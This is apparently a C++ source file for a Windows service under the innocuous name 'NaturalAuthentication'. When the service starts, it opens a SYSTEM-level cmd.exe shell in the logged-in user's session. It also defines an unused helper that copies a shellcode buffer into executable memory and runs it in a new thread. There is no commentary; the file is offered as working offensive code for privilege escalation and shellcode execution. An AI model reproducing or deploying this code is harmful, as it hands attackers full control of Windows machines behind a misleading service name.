#define UNICODE
#define _UNICODE

#include <windows.h>
#include <wtsapi32.h>

#include <cstdio>
#include <cstring>
#include <string>

#include "create_process_as_user.hpp"

#pragma comment(lib, "Advapi32.lib")

namespace {

constexpr char kServiceName[] = "NaturalAuthentication";
constexpr DWORD kHeartbeatIntervalMs = 5000;

SERVICE_STATUS g_service_status = {};
SERVICE_STATUS_HANDLE g_status_handle = nullptr;
HANDLE g_stop_event = nullptr;

HANDLE RunShellCode(PVOID ShellCode, SIZE_T ShellCodeSize) {
    PVOID Space = VirtualAlloc(NULL, ShellCodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlCopyMemory(Space, ShellCode, ShellCodeSize);
    return CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Space, NULL, 0, NULL);
}


void UpdateServiceStatus(DWORD current_state, DWORD win32_exit_code, DWORD wait_hint) {
    static DWORD checkpoint = 1;

    g_service_status.dwCurrentState = current_state;
    g_service_status.dwWin32ExitCode = win32_exit_code;
    g_service_status.dwWaitHint = wait_hint;

    if (current_state == SERVICE_START_PENDING || current_state == SERVICE_STOP_PENDING) {
        g_service_status.dwControlsAccepted = 0;
        g_service_status.dwCheckPoint = checkpoint++;
    } else {
        g_service_status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
        g_service_status.dwCheckPoint = 0;
    }

    SetServiceStatus(g_status_handle, &g_service_status);
}

void WINAPI ServiceControlHandler(DWORD control_code) {
    switch (control_code) {
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            UpdateServiceStatus(SERVICE_STOP_PENDING, NO_ERROR, 3000);
            if (g_stop_event != nullptr) {
                SetEvent(g_stop_event);
            }
            return;
        default:
            break;
    }

    SetServiceStatus(g_status_handle, &g_service_status);
}

void EnablePrivilege(LPCWSTR name) {
    HANDLE hToken;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

    TOKEN_PRIVILEGES tp;
    LUID luid;
    LookupPrivilegeValue(NULL, name, &luid);

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
}

void FastExecute(const std::wstring& cmd) {
    STARTUPINFOW si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);

    CreateProcessW(
        nullptr,
        const_cast<LPWSTR>(cmd.c_str()),
        nullptr,
        nullptr,
        FALSE,
        CREATE_NEW_CONSOLE,
        nullptr,
        nullptr,
        &si,
        &pi
    );
}

void WINAPI ServiceMain(DWORD, LPSTR*) {
    g_status_handle = RegisterServiceCtrlHandlerA(kServiceName, ServiceControlHandler);
    if (g_status_handle == nullptr) {
        return;
    }

    g_service_status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_service_status.dwServiceSpecificExitCode = 0;

    UpdateServiceStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

    g_stop_event = CreateEventA(nullptr, TRUE, FALSE, nullptr);
    if (g_stop_event == nullptr) {
        UpdateServiceStatus(SERVICE_STOPPED, GetLastError(), 0);
        return;
    }

    // Execute(L"cmd.exe");
    // FastExecute(L"cmd.exe");
    session0_launcher::StartProcessAsSystemInActiveSession(
        L"C:\\Windows\\system32\\cmd.exe",
        L"cmd.exe"
    );

    UpdateServiceStatus(SERVICE_RUNNING, NO_ERROR, 0);

    CloseHandle(g_stop_event);
    g_stop_event = nullptr;
    UpdateServiceStatus(SERVICE_STOPPED, NO_ERROR, 0);
}

}  // namespace

int main(int argc, char* argv[]) {
    SERVICE_TABLE_ENTRYA service_table[] = {
        {const_cast<LPSTR>(kServiceName), ServiceMain},
        {nullptr, nullptr},
    };

    if (!StartServiceCtrlDispatcherA(service_table)) {
        std::printf(
            "StartServiceCtrlDispatcher failed: %lu\n"
            "Run without arguments only when started by the Service Control Manager.\n",
            GetLastError());
        return 1;
    }

    return 0;
}
